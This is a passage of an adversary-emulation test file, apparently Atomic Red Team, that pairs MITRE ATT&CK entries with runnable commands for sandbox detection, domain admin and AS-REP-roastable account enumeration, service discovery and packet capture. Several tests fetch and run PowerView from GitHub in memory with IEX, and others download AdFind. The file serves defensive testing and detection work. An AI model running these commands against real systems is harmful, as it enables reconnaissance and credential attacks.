        VME, they may alter their malware to disengage from the victim or conceal
        the core functions of the implant. They may also search for VME artifacts
        before dropping secondary or additional payloads. Adversaries may use the
        information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.(Citation: Deloitte
        Environment Awareness)\n\nSpecific checks will vary based on the target and/or
        adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information
        Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)
        to obtain system information and search for VME artifacts. Adversaries may
        search for VME artifacts in memory, processes, file system, hardware, and/or
        the Registry. Adversaries may use scripting to automate these checks  into
        one script and then have the program exit if it determines the system to be
        a virtual environment. \n\nChecks could include generic system properties
        such as host/domain name and samples of network traffic. Adversaries may also
        check the network adapters addresses, CPU core count, and available memory/drive
        size. \n\nOther common checks may enumerate services running that are unique
        to these applications, installed programs on the system, manufacturer/product
        fields for strings relating to virtual machine applications, and VME-specific
        hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications
        like VMWare, adversaries can also use a special I/O port to send commands
        and receive output. \n \nHardware checks, such as the presence of the fan,
        temperature, and audio devices, could also be used to gather evidence that
        can be indicative a virtual environment. Adversaries may also query for specific
        readings from these devices.(Citation: Unit 42 OilRig Sept 2018)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: Virtualization/sandbox related system checks will likely
        occur in the first steps of an operation but may also occur throughout as
        an adversary learns the environment. Data and events should not be viewed
        in isolation, but as part of a chain of behavior that could lead to other
        activities, such as lateral movement, based on the information obtained. Detecting
        actions related to virtualization and sandbox identification may be difficult
        depending on the adversary's implementation and monitoring required. Monitoring
        for suspicious processes being spawned that gather a variety of system information
        or perform other forms of Discovery, especially in a short period of time,
        may aid in detection.
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      x_mitre_defense_bypassed:
      - Static File Analysis
      - Signature-based detection
      - Host forensic analysis
      - Anti-virus
      identifier: T1497.001
    atomic_tests:
    - name: Detect Virtualization Environment (Linux)
      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
      description: |
        systemd-detect-virt detects execution in a virtualized environment.
        At boot, dmesg stores a log if a hypervisor is detected.
      supported_platforms:
      - linux
      executor:
        name: sh
        elevation_required: true
        command: |
          if (systemd-detect-virt) then echo "Virtualization Environment detected"; fi;
          if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo "Virtualization Environment detected"; fi;
    - name: Detect Virtualization Environment (Windows)
      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
      description: 'Windows Management Instrumentation(WMI) objects contains system
        information which helps to detect virtualization. This command will specifically
        attempt to get the CurrentTemperature value from this object and will check
        to see if the attempt results in an error that contains the word supported.
        This is meant to find the result of Not supported, which is the result if
        run in a virtual machine

        '
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: |
          $error.clear()
          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
          if($error) {echo "Virtualization Environment detected"}
        cleanup_command: "$error.clear()\n"
    - name: Detect Virtualization Environment (MacOS)
      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
      description: 'ioreg contains registry entries for all the device drivers in
        the system. If it''s a virtual machine, one of the device manufacturer will
        be a Virtualization Software.

        '
      supported_platforms:
      - macos
      executor:
        name: sh
        elevation_required: false
        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
          detected''; fi;

          '
    - name: Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)
      auto_generated_guid: 4a41089a-48e0-47aa-82cb-5b81a463bc78
      description: "Windows Management Instrumentation(WMI) objects contain system
        information which helps to detect virtualization. This test will get the model
        and manufacturer of the machine to determine if it is a virtual machine, such
        as through VMware or VirtualBox. \n"
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: |
          $Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"
          $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"
          if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
  T1069.002:
    technique:
      modified: '2023-04-07T17:16:47.754Z'
      name: 'Permission Groups Discovery: Domain Groups'
      description: |-
        Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

        Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Harshal Tupsamudre, Qualys
      - Miriam Wiesner, @miriamxyra, Microsoft Security
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      - 'Group: Group Enumeration'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c
      created: '2020-02-21T21:15:06.561Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1069/002
        external_id: T1069.002
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1069.002
    atomic_tests:
    - name: Basic Permission Groups Discovery Windows (Domain)
      auto_generated_guid: dd66d77d-8998-48c0-8024-df263dc2ce5d
      description: |
        Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
        information will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          net localgroup
          net group /domain
          net group "domain admins" /domain
          net group "enterprise admins" /domain
        name: command_prompt
    - name: Permission Groups Discovery PowerShell (Domain)
      auto_generated_guid: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7
      description: |
        Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
        information will be displayed.
      supported_platforms:
      - windows
      input_arguments:
        user:
          description: User to identify what groups a user is a member of
          type: string
          default: administrator
      executor:
        command: 'get-ADPrincipalGroupMembership #{user} | select name

          '
        name: powershell
    - name: Elevated group enumeration using net group (Domain)
      auto_generated_guid: 0afb5163-8181-432e-9405-4322710c0c37
      description: |
        Runs "net group" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
        test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          net group /domai "Domain Admins"
          net groups "Account Operators" /doma
          net groups "Exchange Organization Management" /doma
          net group "BUILTIN\Backup Operators" /doma
        name: command_prompt
    - name: Find machines where user has local admin access (PowerView)
      auto_generated_guid: a2d71eee-a353-4232-9f86-54f4288dd8c1
      description: 'Find machines where user has local admin access (PowerView). Upon
        execution, progress and info about each host in the domain being scanned will
        be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
        name: powershell
    - name: Find local admins on all machines in domain (PowerView)
      auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
      description: 'Enumerates members of the local Administrators groups across all
        machines in the domain. Upon execution, information about each machine will
        be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
        name: powershell
    - name: Find Local Admins via Group Policy (PowerView)
      auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
      description: 'takes a computer and determines who has admin rights over it through
        GPO enumeration. Upon execution, information about the machine will be displayed.

        '
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: hostname of the computer to analyze
          type: path
          default: "$env:COMPUTERNAME"
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
        name: powershell
    - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
      auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
      description: 'When successful, accounts that do not require kerberos pre-auth
        will be returned

        '
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined.

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually.

          '
      - description: 'Requires the Active Directory module for powershell to be installed.

          '
        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

          '
      executor:
        name: powershell
        elevation_required: false
        command: 'get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth
          -eq $TRUE}

          '
    - name: Adfind - Query Active Directory Groups
      auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -f (objectcategory=group)\n"
        name: command_prompt
    - name: Enumerate Active Directory Groups with Get-AdGroup
      auto_generated_guid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
      description: |
        The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
        Upon successful execution a listing of groups will output with their paths in AD.
        Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
      supported_platforms:
      - windows
      executor:
        name: powershell
        command: 'Get-AdGroup -Filter *

          '
    - name: Enumerate Active Directory Groups with ADSISearcher
      auto_generated_guid: 9f4e344b-8434-41b3-85b1-d38f29d148d0
      description: |
        The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
        Upon successful execution a listing of groups will output with their paths in AD.
        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: '([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()

          '
    - name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
      auto_generated_guid: 43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8
      description: |
        When successful, accounts that do not require kerberos pre-auth will be returned.
        Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined.

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually.

          '
      - description: 'Requires the Active Directory module for powershell to be installed.

          '
        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

          '
      executor:
        name: powershell
        elevation_required: false
        command: 'Get-ADUser -Filter ''useraccountcontrol -band 4194304'' -Properties
          useraccountcontrol | Format-Table name

          '
    - name: Get-DomainGroupMember with PowerView
      auto_generated_guid: 46352f40-f283-4fe5-b56d-d9a71750e145
      description: 'Utilizing PowerView, run Get-DomainGroupMember to identify domain
        users. Upon execution, progress and info about groups within the domain being
        scanned will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
        name: powershell
    - name: Get-DomainGroup with PowerView
      auto_generated_guid: 5a8a181c-2c8e-478d-a943-549305a01230
      description: 'Utilizing PowerView, run Get-DomainGroup to identify the domain
        groups. Upon execution, Groups within the domain will be listed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
        name: powershell
    - name: Active Directory Enumeration with LDIFDE
      auto_generated_guid: 22cf8cb9-adb1-4e8c-80ca-7c723dfc8784
      description: |
        Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.
        The test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF
      supported_platforms:
      - windows
      input_arguments:
        output_path:
          description: Path to the file that ldifde will output
          type: path
          default: C:\Windows\temp
        output_file:
          description: The filename to be created by ldifde
          type: string
          default: atomic_ldifde.txt
      dependency_executor_name: powershell
      dependencies:
      - description: 'PowerShell ActiveDirectory Module must be installed

          '
        prereq_command: |
          Try {
              Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
              exit 0
          }
          Catch {
              exit 1
          }
        get_prereq_command: |
          if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
            Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
          } else {
            Install-WindowsFeature RSAT-AD-PowerShell
          }
      executor:
        elevation_required: true
        command: 'ldifde.exe -f #{output_path}\#{output_file} -p subtree

          '
        cleanup_command: 'del #{output_path}\#{output_file}

          '
        name: command_prompt
  T1007:
    technique:
      modified: '2023-04-03T18:55:18.326Z'
      name: System Service Discovery
      description: |-
        Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.

        Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Harshal Tupsamudre, Qualys
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa
      created: '2017-05-31T21:30:21.315Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1007
        external_id: T1007
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1007
    atomic_tests:
    - name: System Service Discovery
      auto_generated_guid: 89676ba1-b1f8-47ee-b940-2e1a113ebc71
      description: |
        Identify system services.

        Upon successful execution, cmd.exe will execute service commands with expected result to stdout.
      supported_platforms:
      - windows
      executor:
        command: |
          tasklist.exe
          sc query
          sc query state= all
        name: command_prompt
        elevation_required: true
    - name: System Service Discovery - net.exe
      auto_generated_guid: 5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3
      description: |
        Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.

        Upon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Path of file to hold net.exe output
          type: path
          default: "%temp%\\service-list.txt"
      executor:
        command: 'net.exe start >> #{output_file}

          '
        cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1

          '
        name: command_prompt
    - name: System Service Discovery - systemctl
      auto_generated_guid: f4b26bce-4c2c-46c0-bcc5-fce062d38bef
      description: 'Enumerates system service using systemctl

        '
      supported_platforms:
      - linux
      executor:
        command: 'systemctl --type=service

          '
        name: bash
  T1040:
    technique:
      modified: '2023-04-12T23:31:49.085Z'
      name: Network Sniffing
      description: |-
        Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.

        In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

        On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Oleg Kolesnikov, Securonix
      - Tiago Faria, 3CORESec
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

        In cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      - IaaS
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_system_requirements:
      - Network interface access and packet capture driver
      type: attack-pattern
      id: attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529
      created: '2017-05-31T21:30:41.399Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1040
        external_id: T1040
      - source_name: AWS Traffic Mirroring
        description: Amazon Web Services. (n.d.). How Traffic Mirroring works. Retrieved
          March 17, 2022.
        url: https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html
      - source_name: capture_embedded_packet_on_software
        description: Cisco. (2022, August 17). Configure and Capture Embedded Packet
          on Software. Retrieved July 13, 2022.
        url: https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html
      - source_name: GCP Packet Mirroring
        description: Google Cloud. (n.d.). Packet Mirroring overview. Retrieved March
          17, 2022.
        url: https://cloud.google.com/vpc/docs/packet-mirroring
      - source_name: SpecterOps AWS Traffic Mirroring
        description: Luke Paine. (2020, March 11). Through the Looking Glass — Part
          1. Retrieved March 17, 2022.
        url: https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512
      - source_name: Azure Virtual Network TAP
        description: Microsoft. (2022, February 9). Virtual network TAP. Retrieved
          March 17, 2022.
        url: https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview
      - source_name: Rhino Security Labs AWS VPC Traffic Mirroring
        description: Spencer Gietzen. (2019, September 17). Abusing VPC Traffic Mirroring
          in AWS. Retrieved March 17, 2022.
        url: https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1040
    atomic_tests:
    - name: Packet Capture Linux using tshark or tcpdump
      auto_generated_guid: 7fe741f7-b265-4951-a7c7-320889083b3e
      description: |
        Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

        Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.
      supported_platforms:
      - linux
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: ens33
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if at least one of tcpdump or tshark is installed.

          '
        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
          -v tshark)" ]; then exit 1; else exit 0; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
      executor:
        command: |
          tcpdump -c 5 -nnni #{interface}
          tshark -c 5 -i #{interface}
        name: bash
        elevation_required: true
    - name: Packet Capture macOS using tcpdump or tshark
      auto_generated_guid: 9d04efee-eff5-4240-b8d2-07792b873608
      description: |
        Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.

        Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.
      supported_platforms:
      - macos
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0A
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if at least one of tcpdump or tshark is installed.

          '
        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
          -v tshark)" ]; then exit 1; else exit 0; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
      executor:
        command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
          tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
        name: bash
        elevation_required: true
    - name: Packet Capture Windows Command Prompt
      auto_generated_guid: a5b2f6a0-24b4-493e-9590-c699f75723ca
      description: |
        Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark
        installed.

        Upon successful execution, tshark will execute and capture 5 packets on interface "Ethernet".
      supported_platforms:
      - windows
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: Ethernet
        wireshark_url:
          description: wireshark installer download URL
          type: url
          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe
        tshark_path:
          description: path to tshark.exe
          type: path
          default: c:\program files\wireshark\tshark.exe
        npcap_url:
          description: npcap installed download URL
          type: url
          default: https://nmap.org/npcap/dist/npcap-1.31.exe
        npcap_path:
          description: path to npcap.sys
          type: path
          default: C:\Program Files\Npcap\npcap.sys
      dependency_executor_name: powershell
      dependencies:
      - description: 'tshark must be installed and in the default path of "c:\Program
          Files\Wireshark\Tshark.exe".

          '
        prereq_command: if (test-path "#{tshark_path}") {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
          Start-Process $env:temp\wireshark_installer.exe /S
      - description: 'npcap must be installed.

          '
        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
          Start-Process $env:temp\npcap_installer.exe
      executor:
        command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5

          '
        name: command_prompt
        elevation_required: true
    - name: Windows Internal Packet Capture
      auto_generated_guid: b5656f67-d67f-4de8-8e62-b5581630f528
      description: |-
        Uses the built-in Windows packet capture
        After execution you should find a file named trace.etl and trace.cab in the temp directory
      supported_platforms:
      - windows
      executor:
        command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
        cleanup_command: |-
          netsh trace stop >nul 2>&1
          TIMEOUT /T 5 >nul 2>&1
          del %temp%\trace.etl >nul 2>&1
          del %temp%\trace.cab >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Windows Internal pktmon capture
      auto_generated_guid: c67ba807-f48b-446e-b955-e4928cd1bf91
      description: |-
        Will start a packet capture and store log file as t1040.etl.
        https://lolbas-project.github.io/lolbas/Binaries/Pktmon/
      supported_platforms:
      - windows
      executor:
        command: |
          pktmon.exe start --etw  -f %TEMP%\t1040.etl
          TIMEOUT /T 5 >nul 2>&1
          pktmon.exe stop
        cleanup_command: del %TEMP%\t1040.etl
        name: command_prompt
        elevation_required: true
    - name: Windows Internal pktmon set filter
      auto_generated_guid: 855fb8b4-b8ab-4785-ae77-09f5df7bff55
